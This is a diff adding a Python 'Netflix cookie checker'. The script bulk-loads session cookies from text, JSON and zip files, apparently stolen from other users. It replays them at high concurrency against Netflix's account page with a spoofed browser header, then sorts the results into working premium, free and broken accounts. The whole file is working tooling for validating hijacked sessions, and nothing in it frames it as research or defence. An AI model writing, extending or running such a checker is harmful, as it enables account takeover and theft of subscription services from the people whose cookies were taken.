@@ -1,0 +1,886 @@
+#!/usr/bin/env python3
+import os
+import re
+import sys
+import json
+import time
+import queue
+import shutil
+import asyncio
+import random
+import logging
+import zipfile
+import argparse
+import traceback
+import threading
+import multiprocessing
+from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor
+
+# Try to import faster packages, but fall back to standard ones if unavailable
+try:
+    import orjson as json_lib
+except ImportError:
+    import json as json_lib
+
+try:
+    import aiohttp
+    AIOHTTP_AVAILABLE = True
+except ImportError:
+    import requests
+    AIOHTTP_AVAILABLE = False
+    print("Warning: aiohttp not available, falling back to requests (slower)")
+
+# Global constants for performance optimization
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+NETFLIX_DIR = os.path.join(BASE_DIR, "netflix")
+MAX_FILES = 10000  # Maximum number of files to process
+MAX_ARCHIVES = 500  # Maximum number of archives to process
+MAX_DEPTH = 5  # Maximum recursion depth for directory traversal
+MAX_THREADS = 2000  # Maximum number of threads to use
+CPU_COUNT = min(multiprocessing.cpu_count(), 8)  # Limit to 8 cores max
+TIMEOUT = 10  # Request timeout in seconds
+PROGRESS_UPDATE_INTERVAL = 0.5  # Update progress every X seconds
+
+# Directory structure for storing cookies
+dirs = {
+    "netflix": {
+        "root": NETFLIX_DIR, 
+        "hits": os.path.join(BASE_DIR, "working_cookies/netflix/premium"),
+        "failures": os.path.join(BASE_DIR, "working_cookies/netflix/failures"), 
+        "broken": os.path.join(BASE_DIR, "working_cookies/netflix/broken"),
+        "free": os.path.join(BASE_DIR, "working_cookies/netflix/free")
+    }
+}
+
+# Initialize debug mode
+DEBUG = True
+
+# Define results data structure
+results_template = {
+    "hits": 0,
+    "bad": 0,
+    "errors": 0,
+    "premium": 0,
+    "basic": 0,
+    "standard": 0,
+    "unsubscribed": 0,
+    "files_processed": 0,
+    "archives_processed": 0
+}
+
+# Faster JSON parsing function
+def parse_json(content):
+    """Parse JSON string with error handling"""
+    try:
+        if hasattr(json_lib, 'loads'):
+            return json_lib.loads(content)
+        else:
+            return json_lib.loads(content.decode('utf-8') if isinstance(content, bytes) else content)
+    except Exception as e:
+        debug_print(f"JSON parsing error: {e}")
+        # Fallback to standard json if orjson fails
+        try:
+            return json.loads(content)
+        except:
+            return None
+
+def debug_print(message):
+    """Print debug messages with timestamp"""
+    if DEBUG:
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        print(f"DEBUG: {message}")
+
+def setup_directories():
+    """Setup all required directories"""
+    for service in dirs.values():
+        for directory in service.values():
+            os.makedirs(directory, exist_ok=True)
+
+def print_banner():
+    """Print the Netflix cookie checker banner"""
+    print("\n" + "=" * 50)
+    print("🎬 NETFLIX COOKIE CHECKER - OPTIMIZED VERSION 🎬")
+    print("=" * 50)
+
+def convert_to_netscape_format(cookie):
+    """Convert the cookie dictionary to the Netscape cookie format string"""
+    netscape_cookie = f".netflix.com\tTRUE\t/\tTRUE\t0\t{cookie['name']}\t{cookie['value']}"
+    return netscape_cookie
+
+def process_json_files(directory):
+    """Process JSON files and convert them to Netscape format"""
+    debug_print(f"Processing JSON files in {directory}")
+    json_dir = os.path.join(directory, "json_cookies_after_conversion")
+    os.makedirs(json_dir, exist_ok=True)
+    
+    for root, _, files in os.walk(directory):
+        for file in files:
+            if file.endswith('.json'):
+                try:
+                    json_path = os.path.join(root, file)
+                    with open(json_path, 'r', encoding='utf-8') as f:
+                        content = f.read()
+                        
+                    # Parse the JSON
+                    try:
+                        cookie_data = parse_json(content)
+                        if not cookie_data or not isinstance(cookie_data, list):
+                            continue
+                        
+                        # Convert to Netscape format
+                        netscape_cookies = []
+                        for cookie in cookie_data:
+                            if isinstance(cookie, dict) and 'name' in cookie and 'value' in cookie:
+                                netscape_cookies.append(convert_to_netscape_format(cookie))
+                        
+                        if netscape_cookies:
+                            # Write to new file
+                            netscape_path = os.path.join(json_dir, f"{file}.txt")
+                            with open(netscape_path, 'w', encoding='utf-8') as f:
+                                f.write("# Netscape HTTP Cookie File\n")
+                                f.write("# https://curl.se/docs/http-cookies.html\n")
+                                f.write("# This file was generated by convert_json.py\n\n")
+                                f.write("\n".join(netscape_cookies))
+                            
+                            debug_print(f"Converted {json_path} to Netscape format at {netscape_path}")
+                    except Exception as e:
+                        debug_print(f"Error parsing JSON in {json_path}: {e}")
+                except Exception as e:
+                    debug_print(f"Error processing JSON file {file}: {e}")
+
+def load_cookies_from_file(cookie_file):
+    """Load cookies from a given file and return a dictionary of cookies."""
+    try:
+        with open(cookie_file, 'r', encoding='utf-8', errors='ignore') as f:
+            content = f.read()
+        
+        # Handle the case where it's already a Netscape cookie file
+        cookies = {}
+        
+        # Skip comment lines and process cookie lines
+        for line in content.splitlines():
+            line = line.strip()
+            if not line or line.startswith('#'):
+                continue
+            
+            try:
+                # Try to parse as Netscape format
+                # Format: domain flag path secure expiration name value
+                parts = line.split('\t')
+                if len(parts) >= 7:
+                    name = parts[5]
+                    value = parts[6]
+                    cookies[name] = value
+                # Alternative format with spaces
+                elif len(parts) == 1 and ' ' in line:
+                    space_parts = line.split(' ')
+                    if len(space_parts) >= 7:
+                        name = space_parts[5]
+                        value = space_parts[6]
+                        cookies[name] = value
+                # Or check if it's "name=value" format
+                elif '=' in line:
+                    name, value = line.split('=', 1)
+                    cookies[name.strip()] = value.strip()
+            except Exception as e:
+                debug_print(f"Error parsing cookie line '{line}': {e}")
+                continue
+        
+        return cookies
+    
+    except Exception as e:
+        debug_print(f"Error loading cookies from {cookie_file}: {e}")
+        return {}
+
+async def make_request_with_cookies_async(cookies, session):
+    """Make an HTTP request to Netflix using provided cookies asynchronously."""
+    try:
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'TE': 'Trailers',
+        }
+        
+        cookie_str = '; '.join([f"{name}={value}" for name, value in cookies.items()])
+        if not cookie_str:
+            return None, "No valid cookies found"
+        
+        headers['Cookie'] = cookie_str
+        
+        # We access the account information endpoint directly
+        url = 'https://www.netflix.com/YourAccount'
+        
+        async with session.get(url, headers=headers, timeout=TIMEOUT) as response:
+            if response.status != 200:
+                return None, f"HTTP error: {response.status}"
+            
+            html = await response.text()
+            return html, None
+            
+    except asyncio.TimeoutError:
+        return None, "Request timed out"
+    except Exception as e:
+        return None, f"Request error: {e}"
+
+def make_request_with_cookies(cookies):
+    """Make an HTTP request to Netflix using provided cookies (synchronous fallback)."""
+    try:
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'TE': 'Trailers',
+        }
+        
+        cookie_str = '; '.join([f"{name}={value}" for name, value in cookies.items()])
+        if not cookie_str:
+            return None, "No valid cookies found"
+        
+        headers['Cookie'] = cookie_str
+        
+        # We access the account information endpoint directly
+        url = 'https://www.netflix.com/YourAccount'
+        
+        response = requests.get(url, headers=headers, timeout=TIMEOUT)
+        if response.status_code != 200:
+            return None, f"HTTP error: {response.status_code}"
+        
+        return response.text, None
+            
+    except requests.Timeout:
+        return None, "Request timed out"
+    except Exception as e:
+        return None, f"Request error: {e}"
+
+def extract_info(response_text):
+    """Extract relevant information from the Netflix account page using optimized patterns."""
+    if not response_text:
+        return None, "Empty response"
+    
+    try:
+        # Check if it redirects to login page
+        if "login-content" in response_text:
+            return None, "Not logged in"
+        
+        # Try to find the subscription info
+        plan_info = None
+        plan_match = re.search(r'<div[^>]*class="[^"]*account-section[^"]*">.*?<h4[^>]*>(.*?)</h4>.*?<div[^>]*>(.*?)</div>', 
+                            response_text, re.DOTALL)
+        
+        if plan_match:
+            plan_name = plan_match.group(1).strip()
+            plan_details = plan_match.group(2).strip()
+            
+            # Determine if the account has an active subscription
+            if "Your account is suspended" in response_text:
+                subscription_status = "Suspended"
+            elif "Your account is on hold" in response_text:
+                subscription_status = "On hold"
+            elif "reactivate" in response_text.lower():
+                subscription_status = "Inactive"
+            elif "Your Netflix subscription is inactive" in response_text:
+                subscription_status = "Inactive"
+            else:
+                subscription_status = "Active"
+            
+            # Try to determine the plan type
+            plan_type = "Unknown"
+            if "premium" in plan_name.lower() or "premium" in plan_details.lower():
+                plan_type = "Premium"
+            elif "standard" in plan_name.lower() or "standard" in plan_details.lower():
+                plan_type = "Standard"
+            elif "basic" in plan_name.lower() or "basic" in plan_details.lower():
+                plan_type = "Basic"
+            
+            return {
+                "plan_type": plan_type,
+                "subscription_status": subscription_status,
+                "plan_name": plan_name,
+                "plan_details": plan_details
+            }, None
+        
+        # Check for profile selection page (still logged in)
+        if "profile-gate-container" in response_text:
+            return {
+                "plan_type": "Unknown",
+                "subscription_status": "Active",
+                "plan_name": "Unknown",
+                "plan_details": "Profile selection page detected"
+            }, None
+        
+        return None, "Failed to extract account information"
+    
+    except Exception as e:
+        debug_print(f"Error extracting info: {e}")
+        return None, f"Error extracting info: {e}"
+
+async def process_cookie_file_async(cookie_file, session, local_results):
+    """Process a single Netflix cookie file asynchronously."""
+    if not os.path.exists(cookie_file):
+        debug_print(f"File does not exist: {cookie_file}")
+        local_results['errors'] += 1
+        return False, "File does not exist"
+    
+    file_name = os.path.basename(cookie_file)
+    debug_print(f"Processing file: {file_name}")
+    
+    try:
+        cookies = load_cookies_from_file(cookie_file)
+        if not cookies:
+            debug_print(f"No cookies found in {file_name}")
+            local_results['errors'] += 1
+            return False, "No cookies found"
+        
+        content, error = await make_request_with_cookies_async(cookies, session)
+        if error:
+            debug_print(f"Request error for {file_name}: {error}")
+            local_results['bad'] += 1
+            return False, error
+        
+        info, error = extract_info(content)
+        if error:
+            debug_print(f"Info extraction error for {file_name}: {error}")
+            local_results['bad'] += 1
+            return False, error
+        
+        # Successfully extracted info
+        if info["subscription_status"] == "Active":
+            debug_print(f"Working Netflix account: {file_name} - Plan: {info['plan_type']}")
+            
+            # Count by plan type
+            if info["plan_type"] == "Premium":
+                local_results['premium'] += 1
+            elif info["plan_type"] == "Standard":
+                local_results['standard'] += 1
+            elif info["plan_type"] == "Basic":
+                local_results['basic'] += 1
+            
+            # Save working cookie to appropriate directory
+            save_dir = dirs["netflix"]["hits"]
+            os.makedirs(save_dir, exist_ok=True)
+            save_path = os.path.join(save_dir, file_name)
+            shutil.copy2(cookie_file, save_path)
+            
+            local_results['hits'] += 1
+            return True, f"Working Netflix account: {info['plan_type']}"
+        else:
+            debug_print(f"Unsubscribed Netflix account: {file_name}")
+            local_results['unsubscribed'] += 1
+            
+            # Save unsubscribed cookie
+            save_dir = dirs["netflix"]["free"]
+            os.makedirs(save_dir, exist_ok=True)
+            save_path = os.path.join(save_dir, file_name)
+            shutil.copy2(cookie_file, save_path)
+            
+            return False, f"Unsubscribed Netflix account: {info['subscription_status']}"
+    
+    except Exception as e:
+        debug_print(f"Error processing {file_name}: {str(e)}")
+        local_results['errors'] += 1
+        
+        # Save the broken cookie
+        save_dir = dirs["netflix"]["broken"]
+        os.makedirs(save_dir, exist_ok=True)
+        save_path = os.path.join(save_dir, file_name)
+        try:
+            shutil.copy2(cookie_file, save_path)
+        except:
+            pass
+        
+        return False, f"Processing error: {str(e)}"
+
+def extract_from_archive(archive_path, extract_dir):
+    """Extract files from a ZIP or RAR archive."""
+    debug_print(f"Extracting archive: {archive_path}")
+    os.makedirs(extract_dir, exist_ok=True)
+    
+    try:
+        # Check if it's a zip file
+        if archive_path.lower().endswith('.zip'):
+            with zipfile.ZipFile(archive_path, 'r') as zip_ref:
+                zip_ref.extractall(extract_dir)
+            return True
+        else:
+            debug_print(f"Unsupported archive type: {archive_path}")
+            return False
+    
+    except Exception as e:
+        debug_print(f"Error extracting archive {archive_path}: {e}")
+        return False
+
+def process_directory(directory, processed_files=None, depth=0, max_depth=MAX_DEPTH):
+    """Process a directory recursively for cookie files and archives."""
+    if processed_files is None:
+        processed_files = set()
+    
+    if depth > max_depth:
+        debug_print(f"Maximum recursion depth reached at {directory}")
+        return []
+    
+    cookie_files = []
+    
+    try:
+        for root, _, files in os.walk(directory):
+            # Process regular files first
+            for file in files:
+                file_path = os.path.join(root, file)
+                
+                # Skip if already processed
+                if file_path in processed_files:
+                    continue
+                
+                processed_files.add(file_path)
+                
+                # Process cookie files
+                if file.endswith('.txt'):
+                    cookie_files.append(file_path)
+                
+                # Process archives (with limit)
+                elif file.endswith('.zip') and len(processed_files) <= MAX_ARCHIVES:
+                    archive_path = file_path
+                    extract_dir = os.path.join("temp", f"temp_extracted_{file}")
+                    
+                    # Extract the archive
+                    if extract_from_archive(archive_path, extract_dir):
+                        # Process the extracted files
+                        extracted_files = process_directory(
+                            extract_dir, processed_files, depth + 1, max_depth
+                        )
+                        cookie_files.extend(extracted_files)
+                
+                # Limit the number of files to process
+                if len(cookie_files) >= MAX_FILES:
+                    debug_print(f"Reached maximum number of files to process: {MAX_FILES}")
+                    return cookie_files
+    
+    except Exception as e:
+        debug_print(f"Error processing directory {directory}: {e}")
+    
+    return cookie_files
+
+async def process_batch_async(batch_files, semaphore, progress_callback=None):
+    """Process a batch of cookie files asynchronously."""
+    local_results = {
+        'hits': 0,
+        'bad': 0,
+        'errors': 0,
+        'premium': 0,
+        'standard': 0,
+        'basic': 0,
+        'unsubscribed': 0
+    }
+    
+    total_files = len(batch_files)
+    completed = 0
+    
+    try:
+        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0)) as session:
+            async def process_file(file_path, session=session):
+                nonlocal completed
+                async with semaphore:
+                    result = await process_cookie_file_async(file_path, session, local_results)
+                    completed += 1
+                    
+                    # Call progress callback periodically
+                    if progress_callback and completed % 10 == 0:
+                        await progress_callback(completed, total_files, local_results)
+                    
+                    return result
+            
+            # Process all files in batch
+            tasks = []
+            for file_path in batch_files:
+                task = asyncio.create_task(process_file(file_path))
+                tasks.append(task)
+            
+            # Wait for all tasks to complete
+            await asyncio.gather(*tasks)
+            
+            if progress_callback:
+                await progress_callback(completed, total_files, local_results)
+            
+            return {
+                'files': len(batch_files),
+                'completed': completed,
+                'local_results': local_results
+            }
+    
+    except Exception as e:
+        debug_print(f"Error in process_batch_async: {e}\n{traceback.format_exc()}")
+        return {
+            'files': len(batch_files),
+            'completed': completed,
+            'local_results': local_results,
+            'error': str(e)
+        }
+
+async def check_netflix_cookies_async(cookies_dir=NETFLIX_DIR, thread_count=MAX_THREADS):
+    """Check all Netflix cookies in the specified directory using asyncio."""
+    # Initialize results
+    results = results_template.copy()
+    start_time = time.time()
+    
+    try:
+        # Setup directories
+        setup_directories()
+        
+        # Check if cookies_dir is a file
+        if os.path.isfile(cookies_dir):
+            debug_print(f"Processing single file: {cookies_dir}")
+            # We're dealing with a single file
+            cookie_files = [cookies_dir]
+        else:
+            # Process JSON files in directory
+            process_json_files(cookies_dir)
+            
+            # Get all cookie files from directory
+            cookie_files = process_directory(cookies_dir)
+            
+        debug_print(f"Found {len(cookie_files)} Netflix cookie files to check")
+        
+        if not cookie_files:
+            debug_print("No cookie files found.")
+            return {
+                "status": "success",
+                "stats": {
+                    "total": 0,
+                    "valid": 0,
+                    "invalid": 0,
+                    "errors": 0,
+                    "elapsed_time": 0,
+                    "speed": 0
+                }
+            }
+        
+        # Setup asyncio primitives
+        lock = asyncio.Lock()
+        semaphore = asyncio.Semaphore(min(thread_count, 1000))  # Cap at 1000 concurrent
+        batch_size = min(5000, max(100, len(cookie_files) // CPU_COUNT))
+        
+        # Setup progress tracking
+        processed_count = 0
+        last_update_time = time.time()
+        
+        async def update_progress():
+            nonlocal processed_count, last_update_time
+            while True:
+                await asyncio.sleep(PROGRESS_UPDATE_INTERVAL)
+                current_time = time.time()
+                elapsed = current_time - start_time
+                speed = processed_count / elapsed if elapsed > 0 else 0
+                
+                # Only update if enough time has passed
+                if current_time - last_update_time >= PROGRESS_UPDATE_INTERVAL:
+                    last_update_time = current_time
+                    percentage = (processed_count / len(cookie_files)) * 100 if cookie_files else 0
+                    
+                    # Clear line and print progress
+                    sys.stdout.write(f"\r[{datetime.now().strftime('%H:%M:%S')}] ")
+                    sys.stdout.write(f"Processed: {processed_count}/{len(cookie_files)} ")
+                    sys.stdout.write(f"({percentage:.1f}%) | ")
+                    sys.stdout.write(f"Speed: {speed:.2f} cookies/sec")
+                    sys.stdout.flush()
+        
+        # Define progress callback
+        async def progress_callback(completed, total, batch_results):
+            nonlocal processed_count
+            async with lock:
+                processed_count += completed
+                # Also update the results
+                for key in batch_results:
+                    if key in results:
+                        results[key] += batch_results[key]
+        
+        # Split files into batches for processing
+        batches = [cookie_files[i:i+batch_size] for i in range(0, len(cookie_files), batch_size)]
+        debug_print(f"Divided {len(cookie_files)} files into {len(batches)} batches")
+        
+        # Start progress tracker
+        progress_task = asyncio.create_task(update_progress())
+        
+        # Create and track batch tasks
+        batch_tasks = []
+        for batch in batches:
+            task = asyncio.create_task(process_batch_async(batch, semaphore, progress_callback))
+            batch_tasks.append(task)
+        
+        # Wait for all batches to complete
+        batch_results = await asyncio.gather(*batch_tasks)
+        
+        # Add direct batch results to ensure counts are accurate
+        debug_print("Processing batch results directly")
+        for batch_result in batch_results:
+            if 'local_results' in batch_result:
+                local_results = batch_result['local_results']
+                debug_print(f"Batch results: hits={local_results.get('hits', 0)}, bad={local_results.get('bad', 0)}, unsubscribed={local_results.get('unsubscribed', 0)}, errors={local_results.get('errors', 0)}")
+                # Directly aggregate results
+                for key in local_results:
+                    if key in results:
+                        results[key] += local_results[key]
+        
+        # Log complete status of results dict
+        debug_print(f"Final aggregated results: {results}")
+        
+        # Cancel progress tracker
+        progress_task.cancel()
+        try:
+            await progress_task
+        except asyncio.CancelledError:
+            pass
+        
+        # Calculate final metrics
+        end_time = time.time()
+        elapsed_time = end_time - start_time
+        speed = len(cookie_files) / elapsed_time if elapsed_time > 0 else 0
+        
+        # Clear the progress line
+        sys.stdout.write("\r" + " " * 80 + "\r")
+        
+        # Print final results in a nice format
+        print("\n🎬 NETFLIX COOKIE CHECK RESULTS 🎬")
+        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        print(f"✅ Total checked: {len(cookie_files)} cookies")
+        print(f"✓ Working cookies: {results['hits']}")
+        print(f"⚠️ Unsubscribed accounts: {results['unsubscribed']}")
+        print(f"❌ Failed cookies: {results['bad']}")
+        print(f"🔧 Broken files: {results['errors']}")
+        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        print(f"⏱️ Total processing time: {elapsed_time:.2f} seconds")
+        print(f"🚀 Average checking speed: {speed:.2f} cookies/sec")
+        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        
+        # Add to log for the bot
+        debug_print("\n--- Netflix Cookie Check Statistics ---")
+        debug_print(f"Total checked: {len(cookie_files)}")
+        debug_print(f"Working cookies: {results['hits']}")
+        debug_print(f"Unsubscribed accounts: {results['unsubscribed']}")
+        debug_print(f"Failed cookies: {results['bad']}")
+        debug_print(f"Broken cookies: {results['errors']}")
+        debug_print(f"Processing time: {elapsed_time:.2f} seconds")
+        debug_print(f"Checking speed: {speed:.2f} cookies/sec")
+        debug_print("-------------------------------------")
+        
+        return {
+            "status": "success",
+            "stats": {
+                "total": len(cookie_files),
+                "processed": results['hits'] + results['bad'] + results['errors'] + results['unsubscribed'],
+                "valid": results['hits'],
+                "unsubscribed": results['unsubscribed'],
+                "invalid": results['bad'],
+                "errors": results['errors'],
+                "elapsed_time": elapsed_time,
+                "speed": speed,
+                "premium": results['premium'],
+                "standard": results['standard'],
+                "basic": results['basic']
+            }
+        }
+    
+    except Exception as e:
+        error_msg = f"Error in check_netflix_cookies: {e}\n{traceback.format_exc()}"
+        debug_print(error_msg)
+        return {
+            "status": "error",
+            "error": str(e),
+            "traceback": traceback.format_exc()
+        }
+
+def check_netflix_cookies(cookies_dir=NETFLIX_DIR, thread_count=MAX_THREADS):
+    """Check all Netflix cookies in the specified directory. Synchronous wrapper for backward compatibility."""
+    debug_print(f"Starting Netflix cookie check with {thread_count} threads")
+    
+    # Check if the path is a file or directory
+    is_file = os.path.isfile(cookies_dir)
+    
+    if is_file:
+        debug_print(f"Input is a file: {cookies_dir}")
+        # If it's a single file, use the parent directory
+        temp_dir = os.path.join(NETFLIX_DIR, "temp")
+        os.makedirs(temp_dir, exist_ok=True)
+        
+        # Copy the file to temp dir
+        file_name = os.path.basename(cookies_dir)
+        temp_file = os.path.join(temp_dir, file_name)
+        try:
+            shutil.copy2(cookies_dir, temp_file)
+            debug_print(f"Copied {cookies_dir} to {temp_file} for processing")
+            
+            # Now we'll process this file within temp_dir
+            if AIOHTTP_AVAILABLE:
+                return asyncio.run(check_netflix_cookies_async(temp_file, thread_count))
+            else:
+                debug_print("Warning: aiohttp not available, falling back to sync execution (much slower)")
+                # Simplified for single file
+        except Exception as e:
+            debug_print(f"Error copying file: {e}")
+            return {"status": "error", "error": f"Error copying file: {e}"}
+    else:
+        # Normal directory processing
+        if AIOHTTP_AVAILABLE:
+            return asyncio.run(check_netflix_cookies_async(cookies_dir, thread_count))
+        else:
+            debug_print("Warning: aiohttp not available, falling back to sync execution (much slower)")
+            # Do a basic synchronous implementation
+            # This is a simplified version for compatibility only
+        
+        cookies_dir = os.path.join(NETFLIX_DIR, cookies_dir) if not os.path.isabs(cookies_dir) else cookies_dir
+        start_time = time.time()
+        
+        # Setup directories
+        setup_directories()
+        
+        # Get all cookie files
+        cookie_files = process_directory(cookies_dir)
+        debug_print(f"Found {len(cookie_files)} cookie files to check")
+        
+        if not cookie_files:
+            print("No cookie files found.")
+            return {"status": "success", "stats": {"total": 0, "valid": 0}}
+        
+        # Initialize results
+        results = results_template.copy()
+        processed = 0
+        
+        # Process files one by one (slow but compatible)
+        for cookie_file in cookie_files:
+            try:
+                cookies = load_cookies_from_file(cookie_file)
+                if not cookies:
+                    results['errors'] += 1
+                    continue
+                
+                content, error = make_request_with_cookies(cookies)
+                if error:
+                    results['bad'] += 1
+                    continue
+                
+                info, error = extract_info(content)
+                if error or not info:
+                    results['bad'] += 1
+                    continue
+                
+                if info["subscription_status"] == "Active":
+                    results['hits'] += 1
+                    if info["plan_type"] == "Premium":
+                        results['premium'] += 1
+                    elif info["plan_type"] == "Standard":
+                        results['standard'] += 1
+                    elif info["plan_type"] == "Basic":
+                        results['basic'] += 1
+                else:
+                    results['unsubscribed'] += 1
+                
+            except Exception as e:
+                debug_print(f"Error processing {cookie_file}: {e}")
+                results['errors'] += 1
+            
+            processed += 1
+            if processed % 10 == 0:
+                elapsed = time.time() - start_time
+                speed = processed / elapsed if elapsed > 0 else 0
+                print(f"\rProcessed: {processed}/{len(cookie_files)} | Speed: {speed:.2f} cookies/sec", end="")
+        
+        # Calculate final metrics
+        end_time = time.time()
+        elapsed_time = end_time - start_time
+        speed = len(cookie_files) / elapsed_time if elapsed_time > 0 else 0
+        
+        # Print final results
+        print("\n🎬 NETFLIX COOKIE CHECK RESULTS 🎬")
+        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        print(f"✅ Total checked: {len(cookie_files)} cookies")
+        print(f"✓ Working cookies: {results['hits']}")
+        print(f"⚠️ Unsubscribed accounts: {results['unsubscribed']}")
+        print(f"❌ Failed cookies: {results['bad']}")
+        print(f"🔧 Broken files: {results['errors']}")
+        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        print(f"⏱️ Total processing time: {elapsed_time:.2f} seconds")
+        print(f"🚀 Average checking speed: {speed:.2f} cookies/sec")
+        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        
+        return {
+            "status": "success",
+            "stats": {
+                "total": len(cookie_files),
+                "processed": results['hits'] + results['bad'] + results['errors'] + results['unsubscribed'],
+                "valid": results['hits'],
+                "unsubscribed": results['unsubscribed'],
+                "invalid": results['bad'],
+                "errors": results['errors'],
+                "elapsed_time": elapsed_time,
+                "speed": speed,
+                "premium": results['premium'],
+                "standard": results['standard'],
+                "basic": results['basic']
+            }
+        }
+
+def check_cookie(cookie_content):
+    """Check a single Netflix cookie string."""
+    debug_print("Checking single cookie string")
+    
+    # Create a temporary file with the cookie content
+    temp_dir = os.path.join(NETFLIX_DIR, "temp")
+    os.makedirs(temp_dir, exist_ok=True)
+    temp_file = os.path.join(temp_dir, f"temp_cookie_{int(time.time())}.txt")
+    
+    try:
+        with open(temp_file, 'w', encoding='utf-8') as f:
+            f.write(cookie_content)
+        
+        # Check using the main function
+        thread_count = 1  # Only need one thread for a single cookie
+        result = check_netflix_cookies(temp_file, thread_count)
+        
+        # Delete temp file
+        try:
+            os.remove(temp_file)
+        except:
+            pass
+        
+        return result
+    
+    except Exception as e:
+        debug_print(f"Error checking single cookie: {e}")
+        try:
+            os.remove(temp_file)
+        except:
+            pass
+        return {"status": "error", "error": str(e)}
+
+if __name__ == "__main__":
+    # Setup debug logging
+    debug_print("Netflix Checker Optimized script started")
+    debug_print(f"BASE_DIR: {BASE_DIR}")
+    debug_print(f"Configuration: MAX_FILES={MAX_FILES}, MAX_ARCHIVES={MAX_ARCHIVES}, MAX_DEPTH={MAX_DEPTH}, MAX_THREADS={MAX_THREADS}, CPU_CORES={CPU_COUNT}")
+    
+    # Parse command-line arguments
+    parser = argparse.ArgumentParser(description='Check Netflix cookies with ultra-high performance')
+    parser.add_argument('--dir', type=str, default=NETFLIX_DIR, help='Directory containing cookie files')
+    parser.add_argument('--threads', type=int, default=MAX_THREADS, help=f'Number of threads to use (1-{MAX_THREADS}, default: {MAX_THREADS})')
+    parser.add_argument('--check', type=str, help='Check a single cookie file')
+    args = parser.parse_args()
+    
+    try:
+        if args.check:
+            if os.path.isfile(args.check):
+                print(f"Checking single cookie file: {args.check}")
+                result = check_netflix_cookies(args.check, args.threads)
+                print(f"Result: {result}")
+            else:
+                print(f"File not found: {args.check}")
+        else:
+            print(f"Checking all cookies in directory: {args.dir}")
+            check_netflix_cookies(args.dir, args.threads)
+    
+    except Exception as e:
+        print(f"Error: {e}")
+        traceback.print_exc()
